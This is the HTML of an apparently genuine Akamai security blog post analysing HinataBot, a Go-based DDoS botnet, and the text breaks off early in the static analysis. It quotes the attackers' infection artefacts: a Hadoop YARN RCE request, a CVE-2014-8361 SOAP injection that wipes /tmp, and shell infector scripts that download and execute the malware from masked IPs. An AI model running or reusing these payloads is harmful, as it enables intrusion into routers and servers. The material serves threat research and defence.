<script>
(function(win, doc, style, timeout) {
    var STYLE_ID = 'at-body-style';
  
    function getParent() {
      return doc.getElementsByTagName('head')[0];
    }
  
    function addStyle(parent, id, def) {
      if (!parent) {
        return;
      }
  
      var style = doc.createElement('style');
      style.id = id;
      style.innerHTML = def;
      parent.appendChild(style);
    }
  
    function removeStyle(parent, id) {
      if (!parent) {
        return;
      }
  
      var style = doc.getElementById(id);
  
      if (!style) {
        return;
      }
  
      parent.removeChild(style);
    }

    function initFunc() {
        addStyle(getParent(), STYLE_ID, style);
        setTimeout(function() {
            removeStyle(getParent(), STYLE_ID);
        }, timeout);
    }
    window.addEventListener("oneTrustCookieAccepted", function(evt) {
        if(evt.detail.targeting){
            initFunc()
        }
    }, false);

  function getCookie(name) {
      var nameEQ = name + "=";
      var ca = document.cookie.split(';');
      for(var i=0;i < ca.length;i++) {
          var c = ca[i];
          while (c.charAt(0)==' ') c = c.substring(1,c.length);
          if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
      }
      return null;
  }
    
  var cookieCheck = getCookie("OptanonConsent");;
  if(cookieCheck){
      if(cookieCheck.indexOf("C0004%3A1") > 0 ){
          initFunc()
      }
  }
    
  }(window, document, ".akam-target__container {opacity: 0 !important}", 3000));
</script>

<div class="cmp-title" id="title-8fc6f52f27" data-cmp-data-layer="{&#34;title-8fc6f52f27&#34;:{&#34;@type&#34;:&#34;akamai/components/title&#34;,&#34;dc:title&#34;:&#34;Uncovering HinataBot: A Deep Dive into a Go-Based Threat | Akamai&#34;}}">
    
      <h1 class="cmp-title__text">Uncovering HinataBot: A Deep Dive into a Go-Based Threat</h1>
    
</div>

    


</div>
<div class="section section__vertical-center aem-GridColumn aem-GridColumn--default--12">

  
  
  
      

      

  <div class="cmp-section   " data-cmp-data-layer="{&#34;section-552aa65e42&#34;:{&#34;@type&#34;:&#34;akamai/components/section&#34;}}">
    
    
  
    
      <div class="cmp-section__row 1 cmp-section__2-columns">
        <div class="cmp-section__row-wrapper cmp-section__two-column--separate ">
          <div class="columns column-1  fifty-fifty">
            




    
    
    <div class="blogauthor">
<div class="cmp-blog-author" data-cmp-is="cmp-blog-author" id="blogauthor-78adf2c27d" data-cmp-data-layer="{&#34;blogauthor-78adf2c27d&#34;:{&#34;@type&#34;:&#34;akamai/components/blogauthor&#34;}}">

    <div class="cmp-blog-author__inline-section cmp-blog-author-details">
        <div class="cmp-blog-author__image-wrapper">
            <img src="/site/en/images/blog/userpics/akamai-wave-blog-author.png" alt="Akamai Wave Blue"/>
        </div>
        <div class="cmp-blog-author__info">
            <p class="cmp-blog-author__written-by">Written by</p>
            <p class="cmp-blog-author__name"><a href="/blog?author=chad_seaman">Chad Seaman</a>, <a href="/blog?author=larry_cashdollar">Larry Cashdollar</a>, and <a href="/blog?author=allen-west">Allen West</a></p>
            <p class="cmp-blog-author__date">March 16, 2023</p>
        </div>
    </div>

    
        <div class="cmp-blog-author-bio-section">
            <div class="cmp-blog-author__inline-section">
                <div class="cmp-blog-author__image-wrapper">
                    <img src="/site/en/images/blog/userpics/userpic-666-100x100.png" alt="Chad Seaman headshot"/>
                </div>
                <div class="cmp-blog-author__info">
                    <p class="cmp-blog-author__written-by">Written by</p>
                    <p class="cmp-blog-author__name"><a href="/blog?author=chad_seaman">Chad Seaman</a></p>
                </div>
            </div>
            <div class="cmp-blog-author__bio-wrapper">
                <div class="cmp-blog-author__bio"><p>Chad Seaman is a Principal Security Researcher and Team Lead of Akamai’s Security Intelligence Response Team. He proudly refers to himself as an “Internet Dumpster Diver,” and enjoys looking through the muck and mire he finds there. Chad began his career as a programmer, and after being exposed to security, exploitation, and forensics via breach investigations, security quickly became his preferred work. He now spends his time engulfed in malware investigations, reverse engineering, vulnerability research, DDoS, and cybercrime investigations. He likes flying airplanes, poking holes in paper at a distance, and spending time in nature, preferably in the woods, on a trail, or on a dirt bike.</p>
</div>
            </div>
        </div>
    
        <div class="cmp-blog-author-bio-section">
            <div class="cmp-blog-author__inline-section">
                <div class="cmp-blog-author__image-wrapper">
                    <img src="/site/en/images/blog/userpics/larry-cashdollar.jpeg" alt="Larry Cashdollar"/>
                </div>
                <div class="cmp-blog-author__info">
                    <p class="cmp-blog-author__written-by">Written by</p>
                    <p class="cmp-blog-author__name"><a href="/blog?author=larry_cashdollar">Larry Cashdollar</a></p>
                </div>
            </div>
            <div class="cmp-blog-author__bio-wrapper">
                <div class="cmp-blog-author__bio"><p>Larry W. Cashdollar has been working in the security field as a vulnerability researcher for more than 20 years and is currently a Principal Security Researcher on the Security Intelligence Response Team at Akamai. He studied computer science at the University of Southern Maine. Larry has documented more than 300 CVEs and has presented his research at BotConf, BSidesBoston, OWASP Rhode Island, and DEF CON. He enjoys the outdoors and rebuilding small engines in his spare time.</p>
</div>
            </div>
        </div>

                    <p class="cmp-blog-author__written-by">Written by</p>

            <div class="cmp-blog-author__bio-wrapper">
                <div class="cmp-blog-author__bio"><p>Allen West is a Security Researcher on Akamai's Security Intelligence Response Team who loves investigating threats and building tools. He is currently pursuing his master's degree in Information Security and Assurance from Carnegie Mellon University. He received his undergraduate degree in Cybersecurity from Northeastern University, and he is a Marine Corps veteran. During his free time, Allen loves to travel, hike, swim — anything outdoors and adventurous.</p>

<div class="text text__pt-20 aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-859eca57f4&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-15T14:09:00Z&#34;,&#34;xdm:text&#34;:&#34;&lt;h2>Executive summary&lt;/h2>\r\n&#34;}}">
    <h2>Executive summary</h2>

</div>

    

</div>
<div class="text text__pb-20 aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-9c651f80d7&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-15T14:09:24Z&#34;,&#34;xdm:text&#34;:&#34;&lt;ul>\r\n&lt;li>&lt;p>Akamai researchers on the Security Intelligence Response Team (SIRT) have discovered a new Go-based, DDoS-focused botnet. The malware appears to have been named “Hinata” by the malware author after a character from the popular anime series, Naruto. We are calling it “HinataBot.”&amp;nbsp;&lt;/p>\r\n&lt;/li>\r\n&lt;/ul>\r\n&lt;ul>\r\n&lt;li>&lt;p>HinataBot was seen being distributed during the first three months of 2023 and is actively being updated by the authors/operators.&amp;nbsp;&lt;/p>\r\n&lt;/li>\r\n&lt;/ul>\r\n&lt;ul>\r\n&lt;li>&lt;p>The sample was discovered in HTTP and SSH honeypots abusing old vulnerabilities and weak credentials.&amp;nbsp;&lt;/p>\r\n&lt;/li>\r\n&lt;/ul>\r\n&lt;ul>\r\n&lt;li>&lt;p>Infection attempts observed include exploitation of the miniigd SOAP service on Realtek SDK devices (CVE-2014-8361), Huawei HG532 routers (CVE-2017-17215), and exposed Hadoop YARN servers (CVE N/A).&amp;nbsp;&lt;/p>\r\n&lt;/li>\r\n&lt;/ul>\r\n&lt;ul>\r\n&lt;li>&lt;p>Through a combination of reverse engineering the malware and imitating the command and control (C2) server, we were able to get a deep look into how the malware works and what is unique about its resulting attack traffic.&lt;/p>\r\n&lt;/li>\r\n&lt;/ul>\r\n&#34;}}">
    <ul>
<li><p>Akamai researchers on the Security Intelligence Response Team (SIRT) have discovered a new Go-based, DDoS-focused botnet. The malware appears to have been named “Hinata” by the malware author after a character from the popular anime series, Naruto. We are calling it “HinataBot.” </p>
</li>
</ul>
<ul>
<li><p>HinataBot was seen being distributed during the first three months of 2023 and is actively being updated by the authors/operators. </p>
</li>
</ul>
<ul>
<li><p>The sample was discovered in HTTP and SSH honeypots abusing old vulnerabilities and weak credentials. </p>
</li>
</ul>
<ul>
<li><p>Infection attempts observed include exploitation of the miniigd SOAP service on Realtek SDK devices (CVE-2014-8361), Huawei HG532 routers (CVE-2017-17215), and exposed Hadoop YARN servers (CVE N/A). </p>
</li>
</ul>
<ul>
<li><p>Through a combination of reverse engineering the malware and imitating the command and control (C2) server, we were able to get a deep look into how the malware works and what is unique about its resulting attack traffic.</p>
</li>
</ul>

</div>

    

</div>
<div class="button button__large-button button__cta-blue button__white-text button__border-cta-blue button__dark-hover button__left button__fullWidth-mobile aem-GridColumn aem-GridColumn--default--12">



  


<a class="cmp-button" data-cmp-data-layer="{&#34;button-3b954f2deb&#34;:{&#34;@type&#34;:&#34;akamai/components/button&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-16T13:18:54Z&#34;,&#34;dc:title&#34;:&#34;Follow us on Twitter&#34;,&#34;xdm:linkURL&#34;:&#34;https://twitter.com/akamai_research&#34;}}" href="https://twitter.com/akamai_research" target="_blank" rel="nofollow noreferrer" data-cmp-clickable>
    
    <span class="cmp-button__text">Follow us on Twitter</span>
    
</a>

  

</div>
<div class="text text__pt-50 aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-6516554832&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-15T14:11:42Z&#34;,&#34;xdm:text&#34;:&#34;&lt;h2>Introducing, HinataBot&lt;/h2>\r\n&#34;}}">
    <h2>Introducing, HinataBot</h2>

</div>

    

</div>
<div class="text aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-512b3f033c&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-16T13:19:15Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>HinataBot is Go-based malware that the security researchers on Akamai’s SIRT recently found within HTTP and SSH honeypots. This particular sample stood out due to its large size and the lack of specific identification around its newer hashes. The malware binaries appear to have been named by the malware author after a character from the popular anime series, Naruto, with file name structures such as  “Hinata-&amp;lt;OS&amp;gt;-&amp;lt;Architecture&amp;gt;”.&lt;/p>\r\n&lt;p>HinataBot is the newest in the ever-growing list of emerging Go-based threats that includes botnets such as &lt;a href=\&#34;https://www.bleepingcomputer.com/news/security/new-gobruteforcer-malware-targets-phpmyadmin-mysql-ftp-postgres/\&#34; target=\&#34;_blank\&#34; rel=\&#34;nofollow noreferrer\&#34;>GoBruteForcer&lt;/a> and the recently discovered (by SIRT) &lt;a href=\&#34;/content/akamai/en/blog/security-research/kmdsbot-the-attack-and-mine-malware.html\&#34; target=\&#34;_self\&#34;>kmsdbot&lt;/a>. Go has been leveraged by attackers to reap the benefits of its high performance, ease of multi-threading, its multiple architecture and operating system cross-compilation support, but also likely because it adds complexity when compiled, increasing the difficulty of reverse engineering the resulting binaries.&lt;/p>\r\n&lt;p>HinataBot employs various methods of communication, including both dialing out and listening for incoming connections, and has been observed with distributed denial-of-service (DDoS) flooding attacks that utilize protocols such as HTTP, UDP, TCP, and ICMP to send traffic. However, in the latest version, HinataBot has narrowed down its attack methods to only HTTP and UDP attacks.&lt;/p>\r\n&#34;}}">
    <p>HinataBot is Go-based malware that the security researchers on Akamai’s SIRT recently found within HTTP and SSH honeypots. This particular sample stood out due to its large size and the lack of specific identification around its newer hashes. The malware binaries appear to have been named by the malware author after a character from the popular anime series, Naruto, with file name structures such as  “Hinata-&lt;OS&gt;-&lt;Architecture&gt;”.</p>
<p>HinataBot is the newest in the ever-growing list of emerging Go-based threats that includes botnets such as <a href="https://www.bleepingcomputer.com/news/security/new-gobruteforcer-malware-targets-phpmyadmin-mysql-ftp-postgres/" target="_blank" rel="nofollow noreferrer">GoBruteForcer</a> and the recently discovered (by SIRT) <a href="/blog/security-research/kmdsbot-the-attack-and-mine-malware" target="_self">kmsdbot</a>. Go has been leveraged by attackers to reap the benefits of its high performance, ease of multi-threading, its multiple architecture and operating system cross-compilation support, but also likely because it adds complexity when compiled, increasing the difficulty of reverse engineering the resulting binaries.</p>
<p>HinataBot employs various methods of communication, including both dialing out and listening for incoming connections, and has been observed with distributed denial-of-service (DDoS) flooding attacks that utilize protocols such as HTTP, UDP, TCP, and ICMP to send traffic. However, in the latest version, HinataBot has narrowed down its attack methods to only HTTP and UDP attacks.</p>

</div>

    

</div>
<div class="text text__pt-20 aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-bb99425bce&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-15T20:10:43Z&#34;,&#34;xdm:text&#34;:&#34;&lt;h2>HinataBot’s infection campaigns&lt;/h2>\r\n&#34;}}">
    <h2>HinataBot’s infection campaigns</h2>

</div>

    

</div>
<div class="text text__pb-20 aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-89864cfed0&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-16T13:19:25Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>The distribution methods observed were a mix of infection scripts and full payloads using two primary vulnerabilities: a Hadoop YARN RCE (Figure 1) and exploitation of a vulnerability in the miniigd SOAP service within Realtek SDK devices (&lt;a href=\&#34;https://nvd.nist.gov/vuln/detail/CVE-2014-8361\&#34; target=\&#34;_blank\&#34; rel=\&#34;nofollow noreferrer\&#34;>CVE-2014-8361&lt;/a>; Figure 2).&lt;/p>\r\n&#34;}}">
    <p>The distribution methods observed were a mix of infection scripts and full payloads using two primary vulnerabilities: a Hadoop YARN RCE (Figure 1) and exploitation of a vulnerability in the miniigd SOAP service within Realtek SDK devices (<a href="https://nvd.nist.gov/vuln/detail/CVE-2014-8361" target="_blank" rel="nofollow noreferrer">CVE-2014-8361</a>; Figure 2).</p>

</div>

    

</div>
<div class="prismjs aem-GridColumn aem-GridColumn--default--12">
<pre data-cmp-is="prismjs" class="cmp-prismjs lang-bash" data-cmp-data-layer="{&#34;prismjs-1436b4da74&#34;:{&#34;@type&#34;:&#34;akamai/components/prismjs&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-15T20:11:29Z&#34;}}">
  <code data-cmp-hook-prismjs="code" class="lang-bash">/ws/v1/cluster/apps	

{&#34;application-id&#34;: &#34;application_1404198295326_0003&#34;, &#34;application-name&#34;: &#34;get-shell&#34;, &#34;am-container-spec&#34;: {&#34;commands&#34;: {&#34;command&#34;: &#34;wget http://xxx.xxx.xxx.xxx/bins/hinata-linux.amd64 &amp;&amp; chmod +x hinata-linux.amd64 &amp;&amp; ./hinata-linux.amd64 &amp;&#34;}}, &#34;application-type&#34;: &#34;YARN&#34;}</code>
</pre>

<div class="text text__pt-none text__pb-20 aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-56590ffdf3&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-15T20:17:23Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>Fig. 1: Payload distribution through a Hadoop YARN RCE&lt;/p>\r\n&#34;}}">
    <p>Fig. 1: Payload distribution through a Hadoop YARN RCE</p>

</div>

<div class="prismjs aem-GridColumn aem-GridColumn--default--12">
<pre data-cmp-is="prismjs" class="cmp-prismjs lang-bash" data-cmp-data-layer="{&#34;prismjs-609ace23ed&#34;:{&#34;@type&#34;:&#34;akamai/components/prismjs&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-15T14:18:15Z&#34;}}">
  <code data-cmp-hook-prismjs="code" class="lang-bash">/picsdesc.xml	

&lt;?xml version=&#34;1.0&#34; ?&gt;&lt;s:Envelope xmlns:s=&#34;http://schemas.xmlsoap.org/soap/envelope/&#34; s:encodingStyle=&#34;http://schemas.xmlsoap.org/soap/encoding/&#34;&gt;&lt;s:Body&gt;&lt;u:AddPortMapping xmlns:u=&#34;urn:schemas-upnp-org:service:WANIPConnection:1&#34;&gt;&lt;NewRemoteHost&gt;&lt;/NewRemoteHost&gt;&lt;NewExternalPort&gt;47450&lt;/NewExternalPort&gt;&lt;NewProtocol&gt;TCP&lt;/NewProtocol&gt;&lt;NewInternalPort&gt;44382&lt;/NewInternalPort&gt;&lt;NewInternalClient&gt;`cd /tmp/; rm -rf *; wget http://xxx.xxx.xxx.xxx/bins/hinata-linux.mips`&lt;/NewInternalClient&gt;&lt;NewEnabled&gt;1&lt;/NewEnabled&gt;&lt;NewPortMappingDescription&gt;syncthing&lt;/NewPortMappingDescription&gt;&lt;NewLeaseDuration&gt;0&lt;/NewLeaseDuration&gt;&lt;/u:AddPortMapping&gt;&lt;/s:Body&gt;&lt;/s:Envelope&gt;</code>

</div>
<div class="text text__pt-none text__pb-none aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-db5bc1164e&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-15T20:27:38Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>Fig. 2: Payload distribution through CVE-2014-8361&lt;/p>\r\n&#34;}}">
    <p>Fig. 2: Payload distribution through CVE-2014-8361</p>

</div>

    

</div>
<div class="text text__pb-20 aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-15a79896c1&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-15T14:17:01Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>These attacks occurred on multiple days between January 11 and January 16, 2023. The attackers used multiple versions of infector scripts, which were updated over time. Among these scripts, the two primary ones were named &#39;wget.sh&#39; (Figure 3) and &#39;tftp.sh&#39; (Figure 4), reflecting the respective protocols used to fetch the appropriate payload.&lt;/p>\r\n&#34;}}">
    <p>These attacks occurred on multiple days between January 11 and January 16, 2023. The attackers used multiple versions of infector scripts, which were updated over time. Among these scripts, the two primary ones were named 'wget.sh' (Figure 3) and 'tftp.sh' (Figure 4), reflecting the respective protocols used to fetch the appropriate payload.</p>

</div>

    

</div>
<div class="prismjs aem-GridColumn aem-GridColumn--default--12">
<pre data-cmp-is="prismjs" class="cmp-prismjs lang-bash" data-cmp-data-layer="{&#34;prismjs-61f1fea6ab&#34;:{&#34;@type&#34;:&#34;akamai/components/prismjs&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-15T14:18:13Z&#34;}}">
  <code data-cmp-hook-prismjs="code" class="lang-bash">cd /tmp  cd /var/run  cd /mnt  cd /root  cd /; wget http://xxx.xxx.xxx.xxx/bins/hinata-aix.ppc64; chmod +x hinata-aix.ppc64; ./hinata-aix.ppc64; rm -rf hinata-aix.ppc64;

    <p>The HinataBot malware was distributed as Go binaries, which were designed to run on various architectures and operating systems. This trend of malware authors developing specialized payloads for multiple platforms has become increasingly common in recent years (Figure 6), likely due to ease of cross-compilation, as well as Internet of Things (IoT) and small office/home office devices running less common CPU architectures, which has been shown to be a landscape ripe with targets.</p>

<pre data-cmp-is="prismjs" class="cmp-prismjs lang-bash" data-cmp-data-layer="{&#34;prismjs-35f21c664b&#34;:{&#34;@type&#34;:&#34;akamai/components/prismjs&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-15T15:32:51Z&#34;}}">
  <code data-cmp-hook-prismjs="code" class="lang-bash"># Hinata
# Get the Kernel Name
# wget http://xxx.xxx.xxx.xxx/infect.sh &amp;&amp; chmod +x infect.sh &amp;&amp; ./infect.sh &amp;&amp; rm -rf infect.sh
Kernel=$(uname -s)
case $Kernel in
  Linux) Kernel=&#34;linux&#34; ;;
  Darwin) Kernel=&#34;darwin&#34; ;;
  Windows) Kernel=&#34;windows&#34; ;;
  Android) Kernel=&#34;android&#34; ;;
  FreeBSD) Kernel=&#34;freebsd&#34; ;;
  Dragonfly) Kernel=&#34;dragonfly&#34; ;;
  OpenBSD) Kernel=&#34;openbsd&#34; ;;
  NetBSD) Kernel=&#34;netbsd&#34; ;;
  Solaris) Kernel=&#34;solaris&#34; ;;
  *) echo &#34;Your Operating System -&gt; ITS NOT SUPPORTED&#34; ; exit 1 ;;
esac
# Get the machine Architecture
Architecture=$(uname -m)
case $Architecture in
  x86) Architecture=&#34;x86&#34; ;;
  ia64) Architecture=&#34;ia64&#34; ;;
  i?86) Architecture=&#34;x86&#34; ;;
  amd64) Architecture=&#34;amd64&#34; ;;
  x86_64) Architecture=&#34;amd64&#34; ;;
  sparc64) Architecture=&#34;sparc64&#34; ;;
  i386) Architecture=&#34;i386&#34; ;;
  arm64) Architecture=&#34;arm64&#34; ;;
  arm7) Architecture=&#34;arm&#34; ;;
  armc) Architecture=&#34;arm&#34; ;;
  386) Architecture=&#34;386&#34; ;;
  mips) Architecture=&#34;mips&#34; ;;
  mipsle) Architecture=&#34;mipsle&#34; ;;
  mips64) Architecture=&#34;mips64&#34; ;;
  mips64le) Architecture=&#34;mips64le&#34; ;;
  ppc64) Architecture=&#34;ppc64&#34; ;;
  ppc64le) Architecture=&#34;ppc64le&#34; ;;
  s390x) Architecture=&#34;s390x&#34; ;;
  riscv64) Architecture=&#34;riscv64&#34; ;;
  *) echo &#34;Your Architecture &#39;$Architecture&#39; -&gt; ITS NOT SUPPORTED.&#34; ; exit 1 ;;
esac
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; 
wget http://xxx.xxx.xxx.xxx/bins/hinata-$Kernel-$Architecture; 
curl -O http://xxx.xxx.xxx.xxx/bins/hinata-$Kernel-$Architecture;
chmod +x *; 
./hinata-$Kernel-$Architecture;</code>

<div class="text aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-c9e70f4290&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-15T15:37:45Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>The threat actors behind HinataBot have been active since at least December 2022, but only began developing their own malware in mid-January 2023. Since then, we have observed multiple iterations of the malware and various pivots in infection techniques. The primary IP utilized for distribution and command and control (C2) connections has a history of participation in spam and malware distribution. It’s not entirely clear at this point if the IP is malicious by design, or just compromised and being abused.&amp;nbsp;&lt;/p>\r\n&#34;}}">
    <p>The threat actors behind HinataBot have been active since at least December 2022, but only began developing their own malware in mid-January 2023. Since then, we have observed multiple iterations of the malware and various pivots in infection techniques. The primary IP utilized for distribution and command and control (C2) connections has a history of participation in spam and malware distribution. It’s not entirely clear at this point if the IP is malicious by design, or just compromised and being abused. </p>

</div>

<div class="text text__pt-20 aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-0792b06de1&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-15T15:38:19Z&#34;,&#34;xdm:text&#34;:&#34;&lt;h2>Mirai influences&lt;/h2>\r\n&#34;}}">
    <h2>Mirai influences</h2>

</div>

    

</div>
<div class="text text__pb-20 aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-43f40f215d&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-15T15:39:05Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>As previously stated, the actors behind HinataBot originally distributed Mirai binaries, a well-known malware family that started targeting IoT devices, was open sourced, and has continued to be adopted by various actors and groups (and evolved as a result). Mirai now accounts for multiple variants and botnets built by multiple authors, actors, and groups.&amp;nbsp;&lt;/p>\r\n&lt;p>While looking at historical DNS records, we can see that as recently as February 2023 the IP most recently associated with HinataBot was resolving for the domain “hihi.mirailovers.pw” (Figure 10).&lt;/p>\r\n&#34;}}">
    <p>As previously stated, the actors behind HinataBot originally distributed Mirai binaries, a well-known malware family that started targeting IoT devices, was open sourced, and has continued to be adopted by various actors and groups (and evolved as a result). Mirai now accounts for multiple variants and botnets built by multiple authors, actors, and groups. </p>
<p>While looking at historical DNS records, we can see that as recently as February 2023 the IP most recently associated with HinataBot was resolving for the domain “hihi.mirailovers.pw” (Figure 10).</p>

</div>

    

</div>
<div class="image aem-GridColumn aem-GridColumn--default--12">
<div class="cmp-image__wrapper    ">

<div class="text aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-4b972bec3b&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-15T16:00:53Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>There have been numerous public attempts to rewrite Mirai in Go, and HinataBot appears to follow a similar structure to some of these attempts. For example, the way HinataBot sets up communication in its main method and the way it parses commands and begins attacks in its attack methods resemble the structure used in other Go-based Mirai variants.&amp;nbsp;&lt;/p>\r\n&lt;p>It&#39;s worth noting that HinataBot is still in its development stage and evolving. As such, it&#39;s difficult to predict how the malware will change and what it might look like going forward.&amp;nbsp;&lt;/p>\r\n&#34;}}">
    <p>There have been numerous public attempts to rewrite Mirai in Go, and HinataBot appears to follow a similar structure to some of these attempts. For example, the way HinataBot sets up communication in its main method and the way it parses commands and begins attacks in its attack methods resemble the structure used in other Go-based Mirai variants. </p>
<p>It's worth noting that HinataBot is still in its development stage and evolving. As such, it's difficult to predict how the malware will change and what it might look like going forward. </p>

</div>

    

</div>
<div class="text text__pt-20 aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-611854b7b8&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-15T16:02:03Z&#34;,&#34;xdm:text&#34;:&#34;&lt;h2>The first look&lt;/h2>\r\n&#34;}}">
    <h2>The first look</h2>

</div>

    

</div>
<div class="text text__pb-20 aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-36adafed64&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-15T16:06:33Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>We initially attempted to reach out to the most recent distribution IP, but although it was pingable, we were unable to download the sample directly from the server. This may indicate that the attackers have implemented a protective mechanism or that they remove the samples after distribution, making it more difficult to obtain them outside of a direct attack. In older campaigns from the same actors, we observed seemingly randomized name patterns (see Figure 9).&lt;/p>\r\n&lt;p>Fortunately, we were able to get our hands on a sample through our automated analysis tooling that had stored one for us at time of initial infection. We downloaded both the MIPS32 and x86-64 versions from our malware repository and began static analysis. The binaries were both&amp;nbsp; written in Go, but they were relatively friendly to work with, as they were uncorrupted, unpacked, and unstripped (Figure 11). Versions of the binaries in the days leading up to this publication have since been stripped, which will make reversing more challenging going forward.&lt;/p>\r\n&#34;}}">
    <p>We initially attempted to reach out to the most recent distribution IP, but although it was pingable, we were unable to download the sample directly from the server. This may indicate that the attackers have implemented a protective mechanism or that they remove the samples after distribution, making it more difficult to obtain them outside of a direct attack. In older campaigns from the same actors, we observed seemingly randomized name patterns (see Figure 9).</p>
<p>Fortunately, we were able to get our hands on a sample through our automated analysis tooling that had stored one for us at time of initial infection. We downloaded both the MIPS32 and x86-64 versions from our malware repository and began static analysis. The binaries were both  written in Go, but they were relatively friendly to work with, as they were uncorrupted, unpacked, and unstripped (Figure 11). Versions of the binaries in the days leading up to this publication have since been stripped, which will make reversing more challenging going forward.</p>

</div>

    

</div>

  <code data-cmp-hook-prismjs="code" class="lang-bash">$ file hinata

    <p>Fig. 11: Running the ‘file’ command on Hinata</p>

<div class="text text__pb-20 aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-a1c8b1899a&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-16T13:19:40Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>Initially, we began analyzing a two-month-old HinataBot malware sample (Figure 12), but we later became aware of a newer sample (Figure 13) that had been released on the same day that we’d discovered the malware in our logs. We subsequently pivoted to analyzing the newer sample instead. &lt;/p>\r\n&lt;p>The primary distinction between the two versions is that the newer sample has been streamlined and features more modular functionality. Additionally, the newer sample includes a few basic security measures that were not present in the original version. We will delve into these differences in greater detail in a &lt;a href=\&#34;#hinata\&#34; target=\&#34;_self\&#34;>later section of this post.&lt;/a>&lt;/p>\r\n&#34;}}">
    <p>Initially, we began analyzing a two-month-old HinataBot malware sample (Figure 12), but we later became aware of a newer sample (Figure 13) that had been released on the same day that we’d discovered the malware in our logs. We subsequently pivoted to analyzing the newer sample instead. </p>
<p>The primary distinction between the two versions is that the newer sample has been streamlined and features more modular functionality. Additionally, the newer sample includes a few basic security measures that were not present in the original version. We will delve into these differences in greater detail in a <a href="#hinata" target="_self">later section of this post.</a></p>

</div>

<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-394356964a&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-16T16:30:44Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>During our analysis, several functions immediately stood out as noteworthy. Three distinct attack functions caught our eye immediately: &lt;i>sym.main.startAttack&lt;/i>, &lt;i>sym.main.http_flood&lt;/i>, and &lt;i>sym.main.udp_flood&lt;/i> (Figure 14). The naming of these functions suggests that the malware was intended for launching DDoS attacks.&lt;/p>\r\n&#34;}}">
